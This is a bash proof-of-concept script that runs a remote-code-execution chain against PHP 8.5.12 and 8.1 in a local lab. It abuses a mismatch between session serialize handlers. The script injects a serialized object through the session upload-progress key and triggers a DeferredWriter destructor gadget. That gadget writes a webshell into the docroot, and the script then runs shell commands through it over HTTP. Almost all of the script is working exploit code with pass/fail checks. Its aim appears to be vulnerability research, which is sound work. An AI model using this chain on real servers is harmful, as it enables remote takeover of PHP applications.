#!/bin/bash
# =============================================================================
# A0: php_binary write -> php read mismatch: decode SUCCEEDS and $_SESSION
#     RETAINS the injected object -> clean var_dump receipt (8.5.12 + 8.1)
# A5: full RCE chain on the 8.5.12 target build (built-in server):
#     -d session.serialize_handler=php_serialize (ini-level write side),
#     upload_progress key injection, reader ini_set('php') + DeferredWriter
#     gadget -> webshell in docroot -> executed over HTTP.
# =============================================================================
PHP8512=/tmp/php8512_build/plain2/sapi/cli/php
ART=/mnt/c/Users/andre/Downloads/php2shell-claude
ROOT=/tmp/p2s_fin
PORT=18230
URL=http://127.0.0.1:$PORT

rm -rf $ROOT; mkdir -p $ROOT/html $ROOT/sess

cat > $ROOT/w_bin.php <<'EOF'
<?php
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php_binary');
session_id('binsid000000000000000000000000');
session_start();
$_SESSION['userpref'] = 'inj|O:7:"EvilObj":2:{s:3:"cmd";s:5:"BINWR";s:4:"note";s:5:"pwned";}';
session_write_close();
echo "[w_bin] handler=php_binary wrote\n";
EOF
cat > $ROOT/r_php.php <<'EOF'
<?php
class EvilObj {
    public $cmd; public $note;
    public function __wakeup()  { echo "WAKEUP-VAR_DUMP: "; var_dump($this); file_put_contents('/tmp/p2s_fin/BIN_WAKE.txt', "wakeup " . $this->cmd . "\n"); }
    public function __destruct(){ file_put_contents('/tmp/p2s_fin/BIN_DEST.txt', "destruct " . $this->cmd . "\n"); }
}
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php');
session_id('binsid000000000000000000000000');
session_start();
echo "[r_php] decode SUCCESSFUL? \$_SESSION retained:\n";
var_dump($_SESSION);
EOF

echo "=================================================================="
echo " A0: php_binary write / php read -> object RETAINED in \$_SESSION"
echo "=================================================================="
echo "--- 8.5.12 (plain2) ---"
rm -f $ROOT/sess_* $ROOT/BIN_*
$PHP8512 -d session.save_path=$ROOT $ROOT/w_bin.php
hexdump -C $ROOT/sess_binsid000000000000000000000000 | head -6
$PHP8512 -d session.save_path=$ROOT $ROOT/r_php.php
for f in BIN_WAKE.txt BIN_DEST.txt; do [ -f $ROOT/$f ] && echo "[PASS] 8.5.12 $f: $(cat $ROOT/$f)" || echo "[FAIL] 8.5.12 $f missing"; done
echo "--- 8.1.2 (system) ---"
rm -f $ROOT/sess_* $ROOT/BIN_*
php -d session.save_path=$ROOT $ROOT/w_bin.php
hexdump -C $ROOT/sess_binsid000000000000000000000000 | head -6
php -d session.save_path=$ROOT $ROOT/r_php.php
for f in BIN_WAKE.txt BIN_DEST.txt; do [ -f $ROOT/$f ] && echo "[PASS] 8.1 $f: $(cat $ROOT/$f)" || echo "[FAIL] 8.1 $f missing"; done

# ------------------------------------------------------------------ A5: RCE
cat > $ROOT/html/up.php <<'EOF'
<?php header("Content-Type: text/plain"); echo "[up.php 8.5] upload handled; ini handler=" . ini_get('session.serialize_handler') . "\n";
EOF
cat > $ROOT/html/read.php <<'EOF'
<?php
class DeferredWriter {
    public $path; public $data;
    public function __destruct() { file_put_contents($this->path, $this->data); }
}
header("Content-Type: text/plain");
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php');   // read side: php (default app)
session_start();
echo "[read.php 8.5] handler=" . ini_get('session.serialize_handler') . " PHP " . PHP_VERSION . " " . php_sapi_name() . "\n";
foreach ($_SESSION as $k => $v) { echo "  key=" . var_export($k, true) . " -> " . gettype($v); if (is_object($v)) echo " class=" . get_class($v); echo "\n"; }
echo "[read.php 8.5] done\n";
EOF
cat > $ROOT/html/index.php <<'EOF'
<?php echo "8.5.12 lab up " . PHP_VERSION . "\n";
EOF

P_UP=$(php $ART/gen_payloads.php | grep '^P_FIN85=' | cut -d= -f2-)
echo ""
echo "=================================================================="
echo " A5: FULL RCE on the 8.5.12 target build (cli-server, 4 workers)"
echo " write side: -d session.serialize_handler=php_serialize (ini-level),"
echo " upload_progress key injection; read side: script ini_set('php')"
echo "=================================================================="
echo "[A5] payload: $P_UP"
for P in $(pgrep -f "cli/php -S 127.0.0.1:$PORT" 2>/dev/null); do kill -9 $P 2>/dev/null; done
PHP_CLI_SERVER_WORKERS=4 $PHP8512 -S 127.0.0.1:$PORT \
    -d session.serialize_handler=php_serialize \
    -d session.save_path=$ROOT/sess \
    -d session.upload_progress.enabled=1 \
    -d session.upload_progress.cleanup=0 \
    -d session.upload_progress.min_freq=0 \
    -d session.use_strict_mode=0 \
    -t $ROOT/html > $ROOT/srv85.log 2>&1 &
SPID=$!; disown
for i in $(seq 1 30); do curl -s -o /dev/null --max-time 1 $URL/ && break; sleep 0.3; done
rm -f $ROOT/html/fin85_shell.php
SID=a5sid0000000000000000000000000
python3 $ART/up_client.py $PORT full $SID "$P_UP" /up.php
sleep 0.5
echo "--- session file written by the 8.5.12 hook (php_serialize) ---"
hexdump -C $ROOT/sess/sess_$SID 2>/dev/null | head -8
echo "--- read request (reader switches to php) ---"
curl -s -b "PHPSESSID=$SID" $URL/read.php
sleep 0.3
if [ -f $ROOT/html/fin85_shell.php ]; then
  echo "[PASS] A5: 8.5.12 gadget fired, fin85_shell.php written: $(head -c 40 $ROOT/html/fin85_shell.php)"
  R=$(curl -s --get --data-urlencode "c=id; uname -r" "$URL/fin85_shell.php")
  echo "[A5 RCE receipt on 8.5.12] -> $R"
  case "$R" in *uid=*) echo "[PASS] A5 RCE on 8.5.12 (uid output above)";; *) echo "[FAIL] A5 exec";; esac
else echo "[FAIL] A5: shell not written"; fi
kill -9 $SPID 2>/dev/null
echo "=================================================================="
echo " artifacts: $ROOT"
echo "=================================================================="
